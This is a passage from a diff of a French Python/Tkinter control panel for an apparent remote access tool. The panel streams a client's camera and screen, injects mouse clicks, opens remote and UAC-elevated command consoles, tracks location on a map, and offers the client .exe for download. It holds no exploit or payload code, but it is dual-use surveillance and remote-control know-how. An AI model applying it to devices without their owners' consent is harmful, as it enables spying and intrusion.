@@ -2,18 +2,38 @@
 Interface graphique de contrôle — consomme l'API HTTP du serveur.
 
 Cette GUI ne parle jamais directement aux clients : elle passe toujours
-par l'API du serveur.
+par l'API du serveur. Les flux caméra et écran s'affichent EN PERMANENCE
+côte à côte, chacun avec ses propres contrôles (démarrer/arrêter/
+enregistrer) : ce sont deux panneaux totalement indépendants l'un de
+l'autre, y compris pour l'enregistrement.
 
-Ajouts v9 :
-  - Second bouton « CMD Admin » (Windows uniquement) qui déclenche chez le
-    client le popup UAC natif, puis redirige la sortie du cmd.exe élevé
-    vers une seconde fenêtre GUI dédiée.
-  - Le bouton est désactivé si l'appareil sélectionné n'est pas sous Windows.
-  - Si l'utilisateur du client refuse l'UAC, la fenêtre GUI affiche
-    « UAC refusé par l'utilisateur du client ».
+Contrôle souris : quand le flux écran est actif, le client remonte la
+position de sa souris (affichée par un curseur rouge sur l'image) et un
+clic sur l'image écran est converti en coordonnées écran réelles puis
+envoyé au serveur, qui le fait exécuter par le client.
+
+Enregistrement : un thread dédié par flux (VideoRecorder) écrit les images
+à cadence FIXE dans le temps réel (la dernière image reçue est répétée
+tant qu'aucune nouvelle n'arrive), toutes à la même taille, puis le
+fichier est relu et vérifié à l'arrêt pour signaler un problème (vidéo
+vide, écran noir...).
+
+CMD Commandes : une fenêtre GUI par appareil (une par device_id), liée à
+la console persistante du client. Fermer la fenêtre GUI NE ferme PAS la
+console distante — elle continue de tourner côté client. Rouvrir la
+fenêtre réaffiche le buffer courant.
+
+CMD Commandes ADMIN : idem, mais pour la console élevée (UAC Windows).
+La fenêtre GUI pointe vers /api/shell/admin/*. Bouton désactivé si
+l'appareil sélectionné n'est pas sous Windows.
+
+Chat : une fenêtre GUI par appareil, miroir de la conversation avec la
+console visible du client. Seul l'opérateur peut ouvrir/fermer la console
+distante via les boutons dédiés.
 """
 
 import argparse
+import io
 import json
 import os
 import platform
@@ -23,6 +43,7 @@ import time
 import tkinter as tk
 from tkinter import ttk, filedialog
 from dataclasses import dataclass
+from datetime import datetime
 from pathlib import Path
 
 import cv2
@@ -59,6 +80,7 @@ LOG_THROTTLE_SECONDS = 5.0
 MOUSE_CURSOR_COLOR = "#ff3b30"
 MOUSE_CURSOR_RADIUS = 6
 
+# Shell / chat
 SHELL_OUTPUT_POLL_INTERVAL_MS = 300
 SHELL_CHAT_POLL_INTERVAL_MS = 800
 
@@ -91,6 +113,10 @@ STREAM_ACCENTS = {"camera": COLOR_CAMERA, "screen": COLOR_SCREEN}
 FOURCC_CANDIDATES_MP4 = ["mp4v", "avc1", "X264"]
 FOURCC_CANDIDATES_AVI = ["XVID", "MJPG"]
 
+
+# ---------------------------------------------------------------------
+# Configuration persistée
+# ---------------------------------------------------------------------
 
 def _config_dir() -> Path:
     if platform.system() == "Windows":
@@ -125,6 +151,10 @@ def resolve_server_url(cli_value: str | None) -> str:
         return config_value.rstrip("/")
     return DEFAULT_SERVER_URL
 
+
+# ---------------------------------------------------------------------
+# Images générées par le code
+# ---------------------------------------------------------------------
 
 def _hex_to_rgb(color: str) -> tuple[int, int, int]:
     color = color.lstrip("#")
@@ -244,6 +274,8 @@ class RecordingReport:
 
 
 class VideoRecorder:
+    """Écrit dans un fichier vidéo la DERNIÈRE image reçue, à cadence fixe."""
+
     def __init__(self, path: str, fps: float, log=print, on_fatal=None):
         self.path = path
         self.fps = float(fps)
@@ -366,6 +398,8 @@ class VideoRecorder:
 
 
 class StreamPanel:
+    """Regroupe tout ce qui concerne UN flux (caméra ou écran)."""
+
     def __init__(self, key: str, title: str):
         self.key = key
         self.title = title
@@ -417,8 +451,10 @@ class CameraServerApp:
             "screen": StreamPanel("screen", "🖥  Écran"),
         }
 
+        # Fenêtres CMD/Chat, une par device_id
         self._cmd_windows: dict[str, tk.Toplevel] = {}
         self._chat_windows: dict[str, tk.Toplevel] = {}
+        # NOUVEAU : fenêtres CMD Admin, une par device_id
         self._admin_cmd_windows: dict[str, tk.Toplevel] = {}
 
         self._build_ui()
@@ -435,26 +471,8 @@ class CameraServerApp:
         self.root.protocol("WM_DELETE_WINDOW", self._on_close)
 
     # ------------------------------------------------------------------
-    # UI
+    # Construction de l'interface
     # ------------------------------------------------------------------
-    def _apply_theme(self) -> None:
-        style = ttk.Style(self.root)
-        try:
-            style.theme_use("clam")
-        except tk.TclError:
-            pass
-        style.configure("TButton", background=COLOR_CARD, foreground=COLOR_TEXT,
-                        borderwidth=1, focusthickness=0, padding=(10, 6), font=(FONT, 9))
-        style.map("TButton", background=[("active", COLOR_CARD_HI), ("disabled", COLOR_DISABLED_BG)],
-                  foreground=[("disabled", COLOR_DISABLED_FG)])
-        style.configure("Primary.TButton", background=COLOR_ACCENT, foreground="#ffffff",
-                        font=(FONT, 9, "bold"))
-        style.map("Primary.TButton", background=[("active", COLOR_ACCENT_HI), ("disabled", COLOR_DISABLED_BG)])
-        style.configure("TCombobox", fieldbackground=COLOR_CARD, background=COLOR_CARD,
-                        foreground=COLOR_TEXT, arrowcolor=COLOR_TEXT, padding=(6, 4))
-        style.configure("Dark.TCombobox", fieldbackground=COLOR_CARD, background=COLOR_CARD,
-                        foreground=COLOR_TEXT)
-
     def _build_ui(self) -> None:
         self._apply_theme()
 
@@ -464,7 +482,7 @@ class CameraServerApp:
         except tk.TclError:
             pass
 
-        # En-tête
+        # ---- En-tête ----
         header = tk.Frame(self.root, bg=COLOR_CARD)
         header.pack(fill="x")
         tk.Frame(header, bg=COLOR_ACCENT, height=2).pack(fill="x")
@@ -473,59 +491,71 @@ class CameraServerApp:
         tk.Label(header_in, image=self._logo_photo, bg=COLOR_CARD).pack(side="left")
         titles = tk.Frame(header_in, bg=COLOR_CARD)
         titles.pack(side="left", padx=(12, 0))
-        tk.Label(titles, text="Contrôle caméra / écran", bg=COLOR_CARD, fg=COLOR_TEXT,
-                 font=(FONT, 13, "bold")).pack(anchor="w")
-        tk.Label(titles, text="Tableau de bord à distance  ·  multi-appareils  ·  temps réel",
-                 bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 8)).pack(anchor="w")
+        tk.Label(
+            titles, text="Contrôle caméra / écran", bg=COLOR_CARD, fg=COLOR_TEXT, font=(FONT, 13, "bold")
+        ).pack(anchor="w")
+        tk.Label(
+            titles, text="Tableau de bord à distance  ·  multi-appareils  ·  temps réel",
+            bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 8),
+        ).pack(anchor="w")
 
-        self.btn_download = ttk.Button(header_in, text="⬇  Télécharger le client (.exe)",
-                                       command=self.download_client_installer,
-                                       style="Primary.TButton", cursor="hand2")
+        self.btn_download = ttk.Button(
+            header_in, text="⬇  Télécharger le client (.exe)", command=self.download_client_installer,
+            style="Primary.TButton", cursor="hand2",
+        )
         self.btn_download.pack(side="right")
         self.status_var = tk.StringVar(value="● Connexion au serveur...")
-        status_pill = tk.Frame(header_in, bg=COLOR_BG, highlightthickness=1,
-                               highlightbackground=COLOR_BORDER)
+        status_pill = tk.Frame(header_in, bg=COLOR_BG, highlightthickness=1, highlightbackground=COLOR_BORDER)
         status_pill.pack(side="right", padx=(0, 14))
-        self.status_label = tk.Label(status_pill, textvariable=self.status_var, bg=COLOR_BG,
-                                     fg=COLOR_KO, font=(FONT, 9, "bold"), padx=14, pady=5)
+        self.status_label = tk.Label(
+            status_pill, textvariable=self.status_var, bg=COLOR_BG, fg=COLOR_KO,
+            font=(FONT, 9, "bold"), padx=14, pady=5,
+        )
         self.status_label.pack()
         tk.Frame(header, bg=COLOR_BORDER, height=1).pack(fill="x")
 
-        # Barre appareil
+        # ---- Barre d'outils : sélecteur d'appareil ----
         toolbar = tk.Frame(self.root, bg=COLOR_BG)
         toolbar.pack(fill="x", padx=14, pady=(10, 8))
-        tk.Label(toolbar, text=f"Serveur  ·  {self.server_url}", bg=COLOR_BG,
-                 fg=COLOR_MUTED, font=(FONT, 9)).pack(side="right", padx=(14, 0))
-        tk.Label(toolbar, text="APPAREIL", bg=COLOR_BG, fg=COLOR_MUTED,
-                 font=(FONT, 9, "bold")).pack(side="left", padx=(0, 10))
+        tk.Label(
+            toolbar, text=f"Serveur  ·  {self.server_url}", bg=COLOR_BG, fg=COLOR_MUTED, font=(FONT, 9),
+        ).pack(side="right", padx=(14, 0))
+        tk.Label(
+            toolbar, text="APPAREIL", bg=COLOR_BG, fg=COLOR_MUTED, font=(FONT, 9, "bold")
+        ).pack(side="left", padx=(0, 10))
         self.device_var = tk.StringVar()
-        self.device_combo = ttk.Combobox(toolbar, textvariable=self.device_var,
-                                          state="readonly", width=45,
-                                          style="Dark.TCombobox", font=(FONT, 10))
+        self.device_combo = ttk.Combobox(
+            toolbar, textvariable=self.device_var, state="readonly", width=45,
+            style="Dark.TCombobox", font=(FONT, 10),
+        )
         self.device_combo.pack(side="left", fill="x", expand=True, ipady=2)
         self.device_combo.bind("<<ComboboxSelected>>", self._on_device_selected)
 
-        # Barre outils distants
+        # ---- Barre shell/chat ----
         shell_toolbar = tk.Frame(self.root, bg=COLOR_BG)
         shell_toolbar.pack(fill="x", padx=14, pady=(0, 8))
-        tk.Label(shell_toolbar, text="OUTILS DISTANTS", bg=COLOR_BG, fg=COLOR_MUTED,
-                 font=(FONT, 9, "bold")).pack(side="left", padx=(0, 10))
-        self.btn_open_cmd = ttk.Button(shell_toolbar, text="⌨  CMD distant",
-                                       style="Primary.TButton", cursor="hand2",
-                                       command=self._open_cmd_window_for_selected)
+        tk.Label(
+            shell_toolbar, text="OUTILS DISTANTS", bg=COLOR_BG, fg=COLOR_MUTED, font=(FONT, 9, "bold")
+        ).pack(side="left", padx=(0, 10))
+        self.btn_open_cmd = ttk.Button(
+            shell_toolbar, text="⌨  CMD distant", style="Primary.TButton", cursor="hand2",
+            command=self._open_cmd_window_for_selected,
+        )
         self.btn_open_cmd.pack(side="left", padx=(0, 8))
-        self.btn_open_admin_cmd = ttk.Button(shell_toolbar, text="🛡  CMD Admin",
-                                              style="Primary.TButton", cursor="hand2",
-                                              command=self._open_admin_cmd_window_for_selected)
+        # NOUVEAU : bouton CMD Admin, juste après le CMD distant
+        self.btn_open_admin_cmd = ttk.Button(
+            shell_toolbar, text="🛡  CMD Admin", style="Primary.TButton", cursor="hand2",
+            command=self._open_admin_cmd_window_for_selected,
+        )
         self.btn_open_admin_cmd.pack(side="left", padx=(0, 8))
-        self.btn_open_chat = ttk.Button(shell_toolbar, text="💬  Chat distant",
-                                        style="Primary.TButton", cursor="hand2",
-                                        command=self._open_chat_window_for_selected)
+        self.btn_open_chat = ttk.Button(
+            shell_toolbar, text="💬  Chat distant", style="Primary.TButton", cursor="hand2",
+            command=self._open_chat_window_for_selected,
+        )
         self.btn_open_chat.pack(side="left")
 
-        # Zone principale : flux caméra + écran à gauche, log + carte à droite
-        sash = dict(bg=COLOR_BG, sashwidth=8, sashrelief="flat", borderwidth=0, sashpad=0,
-                    opaqueresize=True)
+        # ---- Zone principale ----
+        sash = dict(bg=COLOR_BG, sashwidth=8, sashrelief="flat", borderwidth=0, sashpad=0, opaqueresize=True)
         main = tk.PanedWindow(self.root, orient="horizontal", **sash)
         main.pack(fill="both", expand=True, padx=14, pady=(0, 14))
 
@@ -547,633 +577,1140 @@ class CameraServerApp:
         main.add(location_card, minsize=300, width=420, stretch="never")
 
     def _build_log_panel(self, parent: tk.Misc) -> tk.Frame:
-        log_card = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1,
-                            highlightbackground=COLOR_BORDER)
+        log_card = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1, highlightbackground=COLOR_BORDER)
         header = tk.Frame(log_card, bg=COLOR_CARD)
-        header.pack(fill="x", padx=10, pady=(8, 4))
-        tk.Label(header, text="📋  Journal", bg=COLOR_CARD, fg=COLOR_TEXT,
-                 font=(FONT, 10, "bold")).pack(side="left")
-        self.log_text = tk.Text(log_card, bg=COLOR_VIDEO_BG, fg=COLOR_TEXT,
-                                 font=(FONT_MONO, 8), height=6, wrap="word",
-                                 state="disabled", borderwidth=0, highlightthickness=0)
-        self.log_text.pack(fill="both", expand=True, padx=10, pady=(0, 10))
+        header.pack(fill="x", padx=14, pady=(8, 2))
+        tk.Label(
+            header, text="JOURNAL DES ÉVÉNEMENTS", bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 9, "bold"),
+        ).pack(side="left")
+        ttk.Button(
+            header, text="Effacer", style="Ghost.TButton", cursor="hand2", command=self._clear_log,
+        ).pack(side="right")
+        log_body = tk.Frame(log_card, bg=COLOR_CARD)
+        log_body.pack(fill="both", expand=True, padx=(14, 6), pady=(0, 8))
+        self.log_text = tk.Text(
+            log_body, height=3, state="disabled", bg=COLOR_CARD, fg="#c5cce3",
+            font=(FONT_MONO, 9), relief="flat", borderwidth=0, highlightthickness=0,
+            insertbackground=COLOR_TEXT, selectbackground=COLOR_ACCENT, wrap="word", spacing1=2,
+        )
+        log_scroll = ttk.Scrollbar(
+            log_body, orient="vertical", command=self.log_text.yview, style="Dark.Vertical.TScrollbar"
+        )
+        self.log_text.configure(yscrollcommand=log_scroll.set)
+        log_scroll.pack(side="right", fill="y")
+        self.log_text.pack(side="left", fill="both", expand=True)
+        self.log_text.tag_configure("time", foreground=COLOR_MUTED)
+        self.log_text.tag_configure("err", foreground=COLOR_KO_HI)
+        self.log_text.tag_configure("warn", foreground=COLOR_WARN)
+        self.log_text.tag_configure("ok", foreground=COLOR_OK_HI)
         return log_card
 
-    def _build_location_panel(self, parent: tk.Misc) -> tk.Frame:
-        card = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1,
-                        highlightbackground=COLOR_BORDER)
-        header = tk.Frame(card, bg=COLOR_CARD)
-        header.pack(fill="x", padx=12, pady=(10, 6))
-        tk.Label(header, text="🌍  Localisation", bg=COLOR_CARD, fg=COLOR_TEXT,
-                 font=(FONT, 11, "bold")).pack(side="left")
-        self.btn_location = ttk.Button(header, text="Ouvrir",
-                                        style="Primary.TButton",
-                                        command=self._toggle_location)
-        self.btn_location.pack(side="right")
+    def _clear_log(self) -> None:
+        self.log_text["state"] = "normal"
+        self.log_text.delete("1.0", "end")
+        self.log_text["state"] = "disabled"
 
-        self.location_status = tk.Label(card, text="Aucune donnée de position",
-                                        bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 9))
-        self.location_status.pack(anchor="w", padx=12, pady=(0, 6))
+    def _apply_theme(self) -> None:
+        style = ttk.Style()
+        style.theme_use("clam")
 
-        map_frame = tk.Frame(card, bg=COLOR_VIDEO_BG)
-        map_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))
+        def button(name: str, bg: str, hover: str, fg: str = "white") -> None:
+            style.configure(
+                name, background=bg, foreground=fg, bordercolor=bg, lightcolor=bg, darkcolor=bg,
+                focuscolor=bg, font=(FONT, 9, "bold"), padding=(14, 7), relief="flat", borderwidth=0,
+            )
+            style.map(
+                name,
+                background=[("disabled", COLOR_DISABLED_BG), ("pressed", hover), ("active", hover)],
+                foreground=[("disabled", COLOR_DISABLED_FG)],
+                bordercolor=[("disabled", COLOR_DISABLED_BG), ("active", hover)],
+                lightcolor=[("disabled", COLOR_DISABLED_BG), ("active", hover)],
+                darkcolor=[("disabled", COLOR_DISABLED_BG), ("active", hover)],
+            )
 
-        self.map_view = None
-        if _HAS_MAP:
-            try:
-                self.map_view = TkinterMapView(map_frame, corner_radius=0)
-                self.map_view.pack(fill="both", expand=True)
-                self.map_view.set_position(DEFAULT_MAP_LAT, DEFAULT_MAP_LON)
-                self.map_view.set_zoom(4)
-                try:
-                    self.map_view.set_tile_server(MAP_TILE_SERVER, max_zoom=MAP_TILE_MAX_ZOOM)
-                except Exception:
-                    pass
-            except Exception as exc:
-                self._log(f"Carte indisponible : {exc}")
-                self.map_view = None
-        if self.map_view is None:
-            tk.Label(map_frame, text="(module tkintermapview non installé)",
-                     bg=COLOR_VIDEO_BG, fg=COLOR_MUTED, font=(FONT, 9)).pack(expand=True)
-        return card
+        button("Start.TButton", COLOR_OK, COLOR_OK_HI)
+        button("Stop.TButton", COLOR_KO, COLOR_KO_HI)
+        button("Record.TButton", COLOR_CARD_HI, COLOR_BORDER, fg=COLOR_TEXT)
+        button("RecordOn.TButton", COLOR_REC, COLOR_KO_HI)
+        button("Primary.TButton", COLOR_ACCENT, COLOR_ACCENT_HI)
+        button("Ghost.TButton", COLOR_CARD, COLOR_CARD_HI, fg=COLOR_MUTED)
+        style.configure("Ghost.TButton", padding=(8, 2), font=(FONT, 8))
 
-    def _build_stream_panel(self, parent: tk.Misc, panel: StreamPanel, column: int) -> None:
-        accent = STREAM_ACCENTS[panel.key]
-        card = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1,
-                        highlightbackground=COLOR_BORDER)
-        card.grid(row=0, column=column, sticky="nsew", padx=6, pady=6)
+        style.configure(
+            "Dark.TCombobox", fieldbackground=COLOR_CARD, background=COLOR_CARD_HI, foreground=COLOR_TEXT,
+            arrowcolor=COLOR_CAMERA, bordercolor=COLOR_BORDER, lightcolor=COLOR_CARD, darkcolor=COLOR_CARD,
+            selectbackground=COLOR_CARD, selectforeground=COLOR_TEXT, padding=6,
+        )
+        style.map(
+            "Dark.TCombobox",
+            fieldbackground=[("readonly", COLOR_CARD)],
+            foreground=[("readonly", COLOR_TEXT)],
+            bordercolor=[("focus", COLOR_ACCENT)],
+            arrowcolor=[("active", COLOR_ACCENT_HI)],
+        )
+        style.configure(
+            "Dark.Vertical.TScrollbar", background=COLOR_CARD_HI, troughcolor=COLOR_CARD,
+            bordercolor=COLOR_CARD, lightcolor=COLOR_CARD_HI, darkcolor=COLOR_CARD_HI,
+            arrowcolor=COLOR_MUTED, relief="flat",
+        )
+        style.map("Dark.Vertical.TScrollbar", background=[("active", COLOR_BORDER)])
 
-        header = tk.Frame(card, bg=COLOR_CARD)
-        header.pack(fill="x", padx=10, pady=(8, 6))
-        tk.Label(header, text=panel.title, bg=COLOR_CARD, fg=accent,
-                 font=(FONT, 11, "bold")).pack(side="left")
-        panel.status_var = tk.StringVar(value="Arrêté")
-        panel.status_label = tk.Label(header, textvariable=panel.status_var,
-                                      bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 8))
+        self.root.option_add("*TCombobox*Listbox.background", COLOR_CARD)
+        self.root.option_add("*TCombobox*Listbox.foreground", COLOR_TEXT)
+        self.root.option_add("*TCombobox*Listbox.selectBackground", COLOR_ACCENT)
+        self.root.option_add("*TCombobox*Listbox.selectForeground", "white")
+        self.root.option_add("*TCombobox*Listbox.font", (FONT, 10))
+
+    def _build_stream_panel(self, parent: tk.Frame, panel: StreamPanel, column: int) -> None:
+        accent = STREAM_ACCENTS.get(panel.key, COLOR_ACCENT)
+        outer = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1, highlightbackground=COLOR_BORDER)
+        outer.grid(row=0, column=column, sticky="nsew", padx=(0 if column == 0 else 5, 5 if column == 0 else 0))
+        outer.columnconfigure(0, weight=1)
+        outer.rowconfigure(2, weight=1)
+
+        tk.Frame(outer, bg=accent, height=3).grid(row=0, column=0, sticky="ew")
+
+        title_bar = tk.Frame(outer, bg=COLOR_CARD)
+        title_bar.grid(row=1, column=0, sticky="ew", padx=12, pady=(9, 7))
+        panel.title_var = tk.StringVar(value=panel.title)
+        tk.Label(
+            title_bar, textvariable=panel.title_var, bg=COLOR_CARD, fg=COLOR_TEXT, font=(FONT, 12, "bold")
+        ).pack(side="left")
+        panel.rec_badge = tk.Label(
+            title_bar, text="● REC", bg=COLOR_REC, fg="white", font=(FONT, 9, "bold"), padx=8, pady=1,
+        )
+        panel.status_var = tk.StringVar(value="● Arrêté")
+        panel.status_label = tk.Label(
+            title_bar, textvariable=panel.status_var, bg=COLOR_CARD, fg=COLOR_KO, font=(FONT, 9, "bold"),
+        )
         panel.status_label.pack(side="right")
 
-        video_bg = tk.Frame(card, bg=COLOR_VIDEO_BG, height=380)
-        video_bg.pack(fill="both", expand=True, padx=10)
-        video_bg.pack_propagate(False)
-        panel.video_label = tk.Label(video_bg, bg=COLOR_VIDEO_BG, text="", cursor="crosshair")
+        panel.placeholder = ImageTk.PhotoImage(make_placeholder(panel.key, accent, 96))
+        holder = tk.Frame(outer, bg=COLOR_VIDEO_BG, width=240, height=140)
+        holder.pack_propagate(False)
+        holder.grid(row=2, column=0, sticky="nsew", padx=12)
+        panel.video_label = tk.Label(
+            holder, bg=COLOR_VIDEO_BG, fg=COLOR_MUTED, text="Aucun flux vidéo",
+            image=panel.placeholder, compound="top", font=(FONT, 10), pady=6,
+        )
         panel.video_label.pack(fill="both", expand=True)
-        panel.placeholder = ImageTk.PhotoImage(
-            make_placeholder(panel.key, accent.replace("#", ""), 140))
-        panel.video_label.configure(image=panel.placeholder)
-        panel.video_label.bind("<Button-1>", lambda e, k=panel.key: self._on_video_click(k, e))
+        panel.video_label.bind(
+            "<Configure>",
+            lambda event, p=panel: setattr(p, "view_size", (max(event.width, 1), max(event.height, 1))),
+        )
+        if panel.key == "screen":
+            panel.video_label.configure(cursor="crosshair")
+            panel.video_label.bind("<Button-1>", lambda event, p=panel: self._on_screen_click(p, event))
 
-        ctrl = tk.Frame(card, bg=COLOR_CARD)
-        ctrl.pack(fill="x", padx=10, pady=8)
-        panel.btn_start = ttk.Button(ctrl, text="▶  Démarrer", style="Primary.TButton",
-                                     command=lambda k=panel.key: self._set_stream(k, "START"))
-        panel.btn_start.pack(side="left", padx=(0, 6))
-        panel.btn_stop = ttk.Button(ctrl, text="■  Arrêter",
-                                     command=lambda k=panel.key: self._set_stream(k, "STOP"))
-        panel.btn_stop.pack(side="left", padx=(0, 6))
-        panel.btn_record = ttk.Button(ctrl, text="●  Enregistrer",
-                                       command=lambda k=panel.key: self._toggle_record(k))
-        panel.btn_record.pack(side="left")
-        panel.rec_badge = tk.Label(ctrl, text="", bg=COLOR_CARD, fg=COLOR_REC,
-                                    font=(FONT, 9, "bold"))
-        panel.rec_badge.pack(side="right")
+        controls = tk.Frame(outer, bg=COLOR_CARD)
+        controls.grid(row=3, column=0, sticky="ew", padx=12, pady=10)
+        for col in range(3):
+            controls.columnconfigure(col, weight=1, uniform="ctl")
+        panel.btn_start = ttk.Button(
+            controls, text="▶  Démarrer", style="Start.TButton", cursor="hand2",
+            command=lambda k=panel.key: self._send_command(k, "START"),
+        )
+        panel.btn_start.grid(row=0, column=0, sticky="ew", padx=(0, 6))
+        panel.btn_stop = ttk.Button(
+            controls, text="■  Arrêter", style="Stop.TButton", cursor="hand2",
+            command=lambda k=panel.key: self._send_command(k, "STOP"),
+        )
+        panel.btn_stop.grid(row=0, column=1, sticky="ew", padx=(0, 6))
+        panel.btn_record = ttk.Button(
+            controls, text="⏺  Enregistrer", style="Record.TButton", cursor="hand2",
+            command=lambda k=panel.key: self.toggle_recording(k),
+        )
+        panel.btn_record.grid(row=0, column=2, sticky="ew")
+        panel.btn_start["state"] = "disabled"
+        panel.btn_stop["state"] = "disabled"
+
+    def _show_placeholder(self, panel: StreamPanel) -> None:
+        panel.video_label.configure(image=panel.placeholder, text="Aucun flux vidéo")
+        panel.video_label.image = panel.placeholder
+
+    def _build_location_panel(self, parent: tk.Misc) -> tk.Frame:
+        outer = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1, highlightbackground=COLOR_BORDER)
+        outer.columnconfigure(0, weight=1)
+        outer.rowconfigure(3, weight=1)
+
+        tk.Frame(outer, bg=COLOR_WARN, height=3).grid(row=0, column=0, sticky="ew")
+
+        header = tk.Frame(outer, bg=COLOR_CARD)
+        header.grid(row=1, column=0, sticky="ew", padx=12, pady=(9, 7))
+        tk.Label(
+            header, text="📍  Localisation", bg=COLOR_CARD, fg=COLOR_TEXT, font=(FONT, 12, "bold")
+        ).pack(side="left")
+        self.location_status_var = tk.StringVar(value="● Fermée")
+        self.location_status_label = tk.Label(
+            header, textvariable=self.location_status_var, bg=COLOR_CARD, fg=COLOR_KO, font=(FONT, 9, "bold"),
+        )
+        self.location_status_label.pack(side="right")
+
+        buttons = tk.Frame(outer, bg=COLOR_CARD)
+        buttons.grid(row=2, column=0, sticky="ew", padx=12, pady=(0, 8))
+        buttons.columnconfigure(0, weight=1, uniform="loc")
+        buttons.columnconfigure(1, weight=1, uniform="loc")
+        self.btn_location_open = ttk.Button(
+            buttons, text="🌐  Ouvrir", style="Start.TButton", cursor="hand2",
+            command=lambda: self._send_location_command("OPEN"),
+        )
+        self.btn_location_open.grid(row=0, column=0, sticky="ew", padx=(0, 6))
+        self.btn_location_close = ttk.Button(
+            buttons, text="✖  Fermer", style="Stop.TButton", cursor="hand2",
+            command=lambda: self._send_location_command("CLOSE"),
+        )
+        self.btn_location_close.grid(row=0, column=1, sticky="ew")
+        self.btn_location_open["state"] = "disabled"
+        self.btn_location_close["state"] = "disabled"
+
+        if _HAS_MAP:
+            self.location_map = TkinterMapView(outer, width=200, height=200, corner_radius=0)
+            self.location_map.grid(row=3, column=0, sticky="nsew", padx=12)
+            self.location_map.set_tile_server(MAP_TILE_SERVER, max_zoom=MAP_TILE_MAX_ZOOM)
+            tk.Label(
+                outer, text="Fond de carte © Esri, HERE, Garmin, OpenStreetMap",
+                bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 7),
+            ).grid(row=3, column=0, sticky="sw", padx=16, pady=(0, 2))
+            self.location_map.set_position(DEFAULT_MAP_LAT, DEFAULT_MAP_LON)
+            self.location_map.set_zoom(5)
+        else:
+            self.location_map = None
+            tk.Label(
+                outer,
+                text=(
+                    "Carte indisponible : installez « tkintermapview »\n"
+                    "(pip install tkintermapview) puis relancez.\n"
+                    "Les coordonnées restent affichées ci-dessous."
+                ),
+                bg=COLOR_VIDEO_BG, fg=COLOR_MUTED, font=(FONT, 9), justify="center",
+            ).grid(row=3, column=0, sticky="nsew", padx=12)
+
+        self.location_coords_var = tk.StringVar(value="Aucune position reçue pour le moment.")
+        coords = tk.Label(
+            outer, textvariable=self.location_coords_var, bg=COLOR_CARD, fg=COLOR_MUTED,
+            font=(FONT_MONO, 9), justify="left", anchor="w", wraplength=360,
+        )
+        coords.grid(row=4, column=0, sticky="ew", padx=12, pady=(8, 10))
+        outer.bind("<Configure>", lambda e: coords.configure(wraplength=max(e.width - 28, 120)))
+        return outer
+
+    def _send_location_command(self, command: str) -> None:
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
+            return
+        try:
+            requests.post(
+                f"{self.server_url}/api/location/command",
+                json={"device_id": self.selected_device_id, "command": command},
+                timeout=REQUEST_TIMEOUT,
+            )
+            self._log(f"Commande de localisation envoyée : {command}")
+        except requests.RequestException as exc:
+            self._log(f"Échec de l'envoi de la commande de localisation : {exc}")
 
     # ------------------------------------------------------------------
-    # Logs
+    # Boucles réseau
     # ------------------------------------------------------------------
-    def _log(self, message: str, throttle_key: str | None = None) -> None:
-        now = time.monotonic()
-        if throttle_key is not None:
-            last = self._throttle_times.get(throttle_key)
-            if last is not None and now - last < LOG_THROTTLE_SECONDS:
+    def _poll_devices_loop(self) -> None:
+        while True:
+            try:
+                response = requests.get(f"{self.server_url}/api/devices", timeout=REQUEST_TIMEOUT)
+                response.raise_for_status()
+                devices = {d["device_id"]: d for d in response.json().get("devices", [])}
+                self._sync_device_list(devices)
+            except requests.RequestException:
+                pass
+            time.sleep(POLL_DEVICES_INTERVAL)
+
+    def _poll_status_loop(self) -> None:
+        was_connected = False
+        while True:
+            device_id = self.selected_device_id
+            if device_id is None:
+                time.sleep(POLL_STATUS_INTERVAL)
+                continue
+            try:
+                response = requests.get(
+                    f"{self.server_url}/api/status", params={"device_id": device_id}, timeout=REQUEST_TIMEOUT
+                )
+                response.raise_for_status()
+                data = response.json()
+                connected = data["client_connected"]
+                self.camera_on = data["camera_on"]
+                self.screen_on = data["screen_on"]
+                self.panels["camera"].on = self.camera_on
+                self.panels["screen"].on = self.screen_on
+
+                if connected != was_connected:
+                    self._update_status(connected)
+                    was_connected = connected
+
+                self._sync_buttons(connected)
+
+            except requests.RequestException:
+                if was_connected:
+                    self._update_status(False)
+                    was_connected = False
+
+            time.sleep(POLL_STATUS_INTERVAL)
+
+    def _poll_location_loop(self) -> None:
+        """Interroge /api/location/latest pour l'appareil sélectionné :
+        statut du navigateur (ouvert/fermé) + dernière position connue."""
+        while True:
+            device_id = self.selected_device_id
+            if device_id is None:
+                time.sleep(POLL_LOCATION_INTERVAL)
+                continue
+            try:
+                response = requests.get(
+                    f"{self.server_url}/api/location/latest",
+                    params={"device_id": device_id},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                if response.status_code == 200:
+                    self._update_location_display(response)
+            except requests.RequestException:
+                pass
+            time.sleep(POLL_LOCATION_INTERVAL)
+
+            # Partie deux ###############
+
+        # ------------------------------------------------------------------
+    def _poll_mouse_loop(self) -> None:
+        """Interroge /api/mouse/latest pour dessiner le curseur sur l'image écran."""
+        while True:
+            device_id = self.selected_device_id
+            if device_id is None:
+                time.sleep(POLL_MOUSE_INTERVAL)
+                continue
+            try:
+                response = requests.get(
+                    f"{self.server_url}/api/mouse/latest",
+                    params={"device_id": device_id},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                if response.status_code == 200:
+                    self.mouse_position = response.json()
+            except requests.RequestException:
+                pass
+            time.sleep(POLL_MOUSE_INTERVAL)
+
+    def _poll_frame_loop(self, key: str) -> None:
+        """Un thread de polling par flux : récupère les images en long-polling
+        et les transmet au thread Tk pour affichage (Tk n'est pas thread-safe)."""
+        panel = self.panels[key]
+        last_seq = -1
+        while True:
+            device_id = self.selected_device_id
+            if device_id is None:
+                time.sleep(0.2)
+                continue
+            try:
+                response = requests.get(
+                    f"{self.server_url}/api/frame/latest",
+                    params={
+                        "device_id": device_id,
+                        "stream": key,
+                        "after": last_seq if last_seq >= 0 else "",
